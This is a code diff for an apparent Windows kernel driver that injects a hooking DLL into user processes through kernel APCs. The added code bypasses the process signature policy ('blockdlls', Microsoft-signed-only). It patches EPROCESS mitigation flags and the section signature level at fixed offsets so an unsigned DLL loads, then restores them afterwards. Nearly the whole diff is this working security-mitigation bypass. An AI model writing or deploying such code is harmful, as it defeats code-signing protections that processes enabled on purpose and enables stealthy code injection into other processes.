@@ -24,6 +24,23 @@ NTKERNELAPI BOOLEAN KeInsertQueueApc(PRKAPC Apc, PVOID SystemArgument1,
 }
 
 // ---------------------------------------------------------------------------
+// PsGetProcessMitigationPolicy — local resolver for SignaturePolicy checks.
+// ---------------------------------------------------------------------------
+typedef NTSTATUS (NTAPI *pfnPsGetProcessMitigationPolicy)(
+    PEPROCESS, ULONG, PVOID, SIZE_T);
+
+static pfnPsGetProcessMitigationPolicy g_PsGetMitig = nullptr;
+static volatile LONG g_MitigResolvedLocal = 0;
+
+static VOID EnsureMitigationResolver() {
+    if (InterlockedCompareExchange(&g_MitigResolvedLocal, 1, 0) == 0) {
+        UNICODE_STRING us;
+        RtlInitUnicodeString(&us, L"PsGetProcessMitigationPolicy");
+        g_PsGetMitig = (pfnPsGetProcessMitigationPolicy)MmGetSystemRoutineAddress(&us);
+    }
+}
+
+// ---------------------------------------------------------------------------
 // DllInjector — kernel-mode APC injection of HookDll.dll into user processes.
 //
 // Trigger: ImageLoadNotifyRoutine calls TryInject() on every ntdll.dll load
@@ -71,6 +88,65 @@ struct PendingInject {
 
 static PendingInject g_PendingInjects[MAX_PENDING_INJECT] = {};
 static KSPIN_LOCK    g_PendingLock;
+
+// ---------------------------------------------------------------------------
+// Signature policy bypass tracking (Adam Chester "blockdlls" / ACG bypass).
+//
+// When a process has PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES,
+// LoadLibraryW(HookDll.dll) silently fails because CI rejects the image.
+// We temporarily clear the EPROCESS signature restriction flags before queuing
+// our APC, and restore them after HookDll confirms (or on timeout).
+//
+// Cleared fields:
+//   - MitigationFlags bit 23 (SignatureMitigationOptIn) → disables policy enforcement
+//   - SectionSignatureLevel → set to 0 (unchecked) so CI allows any signature level
+// ---------------------------------------------------------------------------
+#define MAX_SIG_RESTORE 256
+
+struct SigRestore {
+    ULONG pid;
+    ULONG originalMitigFlags;    // full MitigationFlags DWORD
+    UCHAR originalSectionSigLvl; // original SectionSignatureLevel byte
+    BOOLEAN used;
+};
+
+static SigRestore g_SigRestores[MAX_SIG_RESTORE] = {};
+// Protected by g_PendingLock (shared with PendingInject — always acquired together)
+
+// Restore original signature policy flags on an EPROCESS.
+// Called at PASSIVE_LEVEL (IOCTL handler or work item).
+static VOID RestoreSigFlags(ULONG pid) {
+    ULONG origFlags = 0;
+    UCHAR origSigLvl = 0;
+    BOOLEAN found = FALSE;
+
+    // Find and claim the entry under lock
+    KIRQL irql;
+    KeAcquireSpinLock(&g_PendingLock, &irql);
+    for (int i = 0; i < MAX_SIG_RESTORE; i++) {
+        if (g_SigRestores[i].used && g_SigRestores[i].pid == pid) {
+            origFlags  = g_SigRestores[i].originalMitigFlags;
+            origSigLvl = g_SigRestores[i].originalSectionSigLvl;
+            g_SigRestores[i].used = FALSE;
+            found = TRUE;
+            break;
+        }
+    }
+    KeReleaseSpinLock(&g_PendingLock, irql);
+
+    if (!found) return;
+
+    // Patch EPROCESS outside lock (PsLookupProcessByProcessId needs PASSIVE_LEVEL)
+    PEPROCESS proc = nullptr;
+    if (NT_SUCCESS(PsLookupProcessByProcessId(
+            (HANDLE)(ULONG_PTR)pid, &proc))) {
+        PUCHAR eproc = (PUCHAR)proc;
+        *(ULONG*)(eproc + EPROCESS_MITIGATION_FLAGS_OFFSET) = origFlags;
+        *(UCHAR*)(eproc + EPROCESS_SECTION_SIGNATURE_LEVEL) = origSigLvl;
+        ObDereferenceObject(proc);
+        DbgPrint("[+] DllInjector: restored SignaturePolicy for pid=%lu\n", pid);
+    }
+}
 
 // Returns TRUE if pid was already in the set; adds it and returns FALSE otherwise.
 static BOOLEAN MarkInjected(ULONG pid) {
@@ -192,6 +268,62 @@ VOID DllInjector::TryInject(PEPROCESS process, PUNICODE_STRING fullImageName) {
     ULONG pid = HandleToUlong(PsGetProcessId(process));
     if (MarkInjected(pid)) return;
 
+    // -----------------------------------------------------------------------
+    // Bypass ProcessSignaturePolicy (blockdlls / ACG) — Adam Chester technique.
+    //
+    // If the process was created with BLOCK_NON_MICROSOFT_BINARIES, LoadLibraryW
+    // will fail with STATUS_INVALID_IMAGE_HASH because our HookDll isn't
+    // Microsoft-signed.  We temporarily clear the signature restriction in
+    // EPROCESS so our APC succeeds, then restore it from ConfirmInjection().
+    //
+    // Timing: we're in ImageLoadNotifyRoutine for ntdll.dll — this is the very
+    // first image load.  No user code has run yet, so the security window
+    // (policy disabled) only covers system DLL loads which are MS-signed anyway.
+    // -----------------------------------------------------------------------
+    {
+        EnsureMitigationResolver();
+        if (g_PsGetMitig) {
+            DWORD sigFlags = 0;
+            if (NT_SUCCESS(g_PsGetMitig(process, 8 /*ProcessSignaturePolicy*/,
+                    &sigFlags, sizeof(sigFlags))) &&
+                (sigFlags & 0x1)) // bit 0 = MicrosoftSignedOnly
+            {
+                PUCHAR eproc = (PUCHAR)process;
+
+                // Save original values for restoration
+                ULONG origMitigFlags = *(ULONG*)(eproc + EPROCESS_MITIGATION_FLAGS_OFFSET);
+                UCHAR origSigLevel   = *(UCHAR*)(eproc + EPROCESS_SECTION_SIGNATURE_LEVEL);
+
+                // Clear SignatureMitigationOptIn (bit 23) in MitigationFlags
+                *(ULONG*)(eproc + EPROCESS_MITIGATION_FLAGS_OFFSET) =
+                    origMitigFlags & ~(1UL << MITIGATION_SIGNATURE_OPT_IN_BIT);
+
+                // Zero SectionSignatureLevel — remove minimum signature requirement
+                *(UCHAR*)(eproc + EPROCESS_SECTION_SIGNATURE_LEVEL) = 0;
+
+                // Record for later restoration
+                KIRQL irql;
+                KeAcquireSpinLock(&g_PendingLock, &irql);
+                for (int i = 0; i < MAX_SIG_RESTORE; i++) {
+                    if (!g_SigRestores[i].used) {
+                        g_SigRestores[i].pid                 = pid;
+                        g_SigRestores[i].originalMitigFlags  = origMitigFlags;
+                        g_SigRestores[i].originalSectionSigLvl = origSigLevel;
+                        g_SigRestores[i].used                = TRUE;
+                        break;
+                    }
+                }
+                KeReleaseSpinLock(&g_PendingLock, irql);
+
+                DbgPrint("[+] DllInjector: cleared SignaturePolicy for pid=%lu "
+                         "(MitigFlags=0x%X→0x%X, SectionSigLvl=%u→0) — will restore on confirm\n",
+                         pid, origMitigFlags,
+                         origMitigFlags & ~(1UL << MITIGATION_SIGNATURE_OPT_IN_BIT),
+                         origSigLevel);
+            }
+        }
+    }
+
     // Allocate a READWRITE buffer in the target process.
     // NtCurrentProcess() resolves to the attached process context.
     PVOID  pathBuf  = nullptr;
@@ -258,6 +390,7 @@ VOID DllInjector::TryInject(PEPROCESS process, PUNICODE_STRING fullImageName) {
 
 // ---------------------------------------------------------------------------
 // ConfirmInjection — called from IOCTL handler when HookDll reports success.
+// Also restores any temporarily-cleared SignaturePolicy flags.
 // ---------------------------------------------------------------------------
 VOID DllInjector::ConfirmInjection(ULONG pid) {
     KIRQL irql;
@@ -269,6 +402,12 @@ VOID DllInjector::ConfirmInjection(ULONG pid) {
         }
     }
     KeReleaseSpinLock(&g_PendingLock, irql);
+
+    // Restore SignaturePolicy flags if we cleared them for this PID.
+    // HookDll is now loaded and hooked — safe to re-enable the policy so the
+    // process's intended blockdlls protection applies to all subsequent loads.
+    RestoreSigFlags(pid);
+
     DbgPrint("[+] DllInjector: HookDll confirmed for pid=%lu\n", pid);
 }
 
@@ -318,6 +457,10 @@ VOID DllInjector::CheckPendingTimeouts() {
                 }
             } else { ExFreePool(notif); }
         }
+
+        // Restore SignaturePolicy flags if we cleared them — injection failed,
+        // no reason to leave the process with weakened signature enforcement.
+        RestoreSigFlags(pid);
 
         // Re-acquire and continue scanning
         KeAcquireSpinLock(&g_PendingLock, &irql);
